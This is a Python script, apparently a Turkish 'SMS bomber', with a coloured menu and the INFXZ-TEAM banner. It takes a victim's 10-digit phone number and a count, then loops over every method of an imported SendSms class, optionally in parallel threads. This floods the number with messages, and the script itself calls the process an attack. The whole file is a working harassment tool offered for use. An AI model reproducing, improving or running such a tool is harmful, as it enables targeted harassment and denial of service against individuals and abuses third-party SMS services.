from colorama import Fore, Style, init
from os import system
from sms_api import SendSms
from time import sleep
import threading

init(autoreset=True)
def clear(): system("clear")

def banner():
    # Enough tarzı keskin renkler: Cyan ve Beyaz
    print(rf"""{Fore.CYAN}
  \  |  ____| \ \  / __  /     ___|    \  |   ___| 
   \ |  |      \  /     /    \___ \   |\/ | \___ \ 
 |\  |  __|       \    / _____|    |  |   |       |
_| \_| _|      _/\_\ ____|   _____/  _|  _| _____/ 

{Fore.WHITE}» {Fore.CYAN}Developer: {Fore.WHITE}INFXZ-TEAM
{Fore.WHITE}» {Fore.CYAN}Status:    {Fore.WHITE}System Ready
    """)

while True:
    clear()
    banner()
    print(f"{Fore.CYAN}[1] {Fore.WHITE}SMS Gönder (Normal)")
    print(f"{Fore.CYAN}[2] {Fore.WHITE}SMS Gönder (Turbo)")
    print(f"{Fore.CYAN}[3] {Fore.WHITE}Çıkış{Style.RESET_ALL}\n")
    
    secim = input(f"{Fore.CYAN}root@INFXZ~# {Fore.WHITE}").strip()
    
    if secim in ["1", "2"]:
        print(f"\n{Fore.CYAN}[!] {Fore.WHITE}Numara (Başında 0 olmadan, örn: 5XXXXXXXXX):")
        tel = input(f"{Fore.CYAN}root@INFXZ~# {Fore.WHITE}").strip()
        
        if len(tel) != 10 or not tel.isdigit():
            print(f"{Fore.RED}[!] HATA: Numara 10 haneli olmalı!")
            sleep(2); continue
            
        adet = int(input(f"{Fore.CYAN}[!] {Fore.WHITE}Adet: {Fore.CYAN}").strip())
        
        sms = SendSms(tel, "")
        metodlar = [getattr(sms, m) for m in dir(sms) if callable(getattr(sms, m)) and not m.startswith('__') and m != "adet" and m != "log"]
        
        print(f"\n{Fore.CYAN}[*] {Fore.WHITE}Saldırı başlıyor... (CTRL+C durdurur)")
        try:
            count = 0
            while count < adet:
                for m in metodlar:
                    if secim == "2": threading.Thread(target=m).start()
                    else: m(); sleep(0.3)
                count += 1
                print(f"{Fore.CYAN}[+] {Fore.WHITE}Döngü: {count}/{adet}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] SALDIRI DURDURULDU!")
        input(f"\n{Fore.CYAN}>> {Fore.WHITE}Ana menü için Enter.")
    elif secim == "3": break

